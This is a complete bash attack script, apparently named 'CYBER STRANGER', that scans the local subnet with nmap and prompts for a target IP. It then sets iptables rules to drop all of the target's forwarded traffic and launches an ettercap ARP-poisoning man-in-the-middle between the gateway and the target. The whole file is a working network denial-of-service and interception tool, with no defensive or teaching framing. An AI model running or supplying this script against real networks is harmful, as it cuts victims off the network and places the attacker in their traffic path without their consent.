#!/bin/bash

# 1. Root Check
if [ "$EUID" -ne 0 ]; then 
  echo "[-] Error: Please run this script with sudo."
  exit 1
fi

echo "===================================================="
echo "      CYBER STRANGER - FINAL STABLE BUILD          "
echo "===================================================="

# 2. Identify Network Interface
interfaces=($(ls /sys/class/net | grep -v lo))
echo "[+] Available Interfaces:"
for i in "${!interfaces[@]}"; do
    echo "$((i+1)). ${interfaces[$i]}"
done
echo -n "Type the interface name: "
read selected_interface

# 3. Network Info (Cleaning variables to prevent hidden spaces)
ip_addr=$(ip -4 addr show "$selected_interface" | awk '/inet / {print $2}' | cut -d/ -f1 | xargs)
gateway=$(ip route show dev "$selected_interface" | awk '/default/ {print $3}' | xargs)

if [ -z "$ip_addr" ]; then
    echo "[-] Error: No IP found. Check VMware Bridged settings."
    exit 1
fi

subnet=$(echo "$ip_addr" | awk -F. '{print $1"."$2"."$3".0/24"}')
echo "[*] Scanning $subnet..."
mapfile -t hosts < <(nmap -sn "$subnet" | awk '/Nmap scan report/{print $5}' | grep -v "$ip_addr")

echo "----------------------------------------------------"
for host in "${hosts[@]}"; do echo "  -> $host"; done
echo "----------------------------------------------------"
echo -n "Enter Target IP: "
read target_ip
target_ip=$(echo "$target_ip" | xargs)

# 4. Preparing the Black Hole
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -F
iptables -A FORWARD -s "$target_ip" -j DROP
iptables -A FORWARD -d "$target_ip" -j DROP

# 5. The "Golden" Command for 0.8.3.1
# Added '-M arp:remote' which is often required for specific parameter parsing
echo "[*] Launching: sudo ettercap -T -q -i $selected_interface -M arp:remote // $gateway // // $target_ip //"

sudo iptables -P FORWARD DROP
sudo ettercap -T -q -i "$selected_interface" -M arp:remote //"$gateway"// //"$target_ip"//

# 6. Cleanup
echo -e "\n[*] Restoring network..."
iptables -F
echo 0 > /proc/sys/net/ipv4/ip_forward
